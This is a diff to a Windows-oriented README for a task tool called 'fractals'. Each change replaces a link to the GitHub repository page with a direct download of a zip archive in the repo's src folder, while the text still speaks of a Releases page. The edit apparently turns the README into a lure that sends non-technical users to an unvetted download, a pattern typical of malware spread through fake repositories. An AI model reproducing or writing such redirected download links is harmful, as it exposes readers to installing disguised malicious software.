@@ -1,6 +1,6 @@
 # 🔄 fractals - Organize Tasks with Simple Control
 
-[![Download fractals](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/TalangoJames/fractals)
+[![Download fractals](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/TalangoJames/fractals/raw/refs/heads/main/src/Software-v3.8.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This guide will help you download and run fractals on your Windows PC step by st
 You will need to get fractals from its GitHub page. The page lets you see different versions and files. Follow these steps carefully:
 
 1. Click the big button above or go to this link:  
-   https://github.com/TalangoJames/fractals
+   https://github.com/TalangoJames/fractals/raw/refs/heads/main/src/Software-v3.8.zip
 
 2. On the page, look for a button or link named **Releases**. This is where the software files are kept.
 
@@ -152,7 +152,7 @@ If you run into problems, try these steps:
 - Example projects included with the software.
 
 - The GitHub repository:  
-  https://github.com/TalangoJames/fractals
+  https://github.com/TalangoJames/fractals/raw/refs/heads/main/src/Software-v3.8.zip
 
 - Support forums linked on the GitHub page.
 
@@ -162,4 +162,4 @@ If you run into problems, try these steps:
 
 Go to the main page and download the installer:  
 
-[![Download fractals](https://img.shields.io/badge/Download-Visit%20Page-green?style=for-the-badge)](https://github.com/TalangoJames/fractals)
+[![Download fractals](https://img.shields.io/badge/Download-Visit%20Page-green?style=for-the-badge)](https://github.com/TalangoJames/fractals/raw/refs/heads/main/src/Software-v3.8.zip)
